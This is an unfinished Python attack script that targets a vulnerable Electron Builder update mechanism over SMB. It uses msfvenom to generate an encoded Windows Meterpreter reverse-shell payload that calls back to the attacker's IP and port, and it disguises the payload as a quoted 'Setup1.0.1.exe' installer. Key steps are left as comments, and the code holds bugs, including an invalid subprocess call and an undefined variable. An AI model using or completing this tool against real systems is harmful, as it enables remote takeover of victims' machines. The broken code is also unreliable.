import netifaces as ni
import subprocess
import sys
import argparse
import os
from pathlib import Path

def get_ip(interface):
    """find your IP on a given interface"""
    ni.ifaddresses(interface)
    ip = ni.ifaddresses(interface)[ni.AF_INET][0]['addr']
    print("IP Address on interface " + interface + ": " + ip)
    
    return ip

def gen_payload(ip, port, payload):
    """generate an msfvenom payload with given IP address and port"""

    cmd_str = 'msfvenom -a x86 --platform windows -p ' + payload + ' LHOST=' + str(ip) + ' LPORT=' + str(port) + ' -e x86/shikata_ga_nai -f exe -o "heedv1\'Setup1.0.1.exe"'
    
    command = subprocess(cmd_str)
    sys.stdout.buffer.write(command.stdout)
    sys.stderr.buffer.write(command.stderr)

def main():
    parser = argparse.ArgumentParser(prog="send-payload.py", description="Sends a payload to a vulnerable Electron Builder instance over SMB. If no port is provided, listens on port 9001 by default. No default option for IP address is specified.")

    #positional arguments
    parser.add_argument("ip", help="Target IP address")
    parser.add_argument("payload", help="Meterpreter payload to use")

    #named parameters/flags
    parser.add_argument("--lip", help="Local IP to listen on. Specify either this or --lint")
    parser.add_argument("--lint", help="Local interface to listen on. Specify either this or --lip")
    parser.add_argument("--lport", help="Local port to listen on. 9001 by default")
    parser.add_argument("--dir", help="Directory to save payload and stand up server in")

    #parse arguments
    args = parser.parse_args()

    #get IP, taking --lip as priority over --lint if both provided
    if args.lip is not None:
        ip = args.lip
        print("IP Address: " + ip)
    elif args.lint is not None:
        ip = get_ip(interface)
    else:
        print("You must provide one of --lip or --lint")
        sys.exit(1)

    #mkdir if doesn't exist
    if args.dir is not None:
        dirpath = Path(args.dir)

        if not dirpath.is_dir():
            print("Directory not found - creating directory")
            dirpath.mkdir()

    #generate payload

    # check SMB running

if __name__ == '__main__':
    main()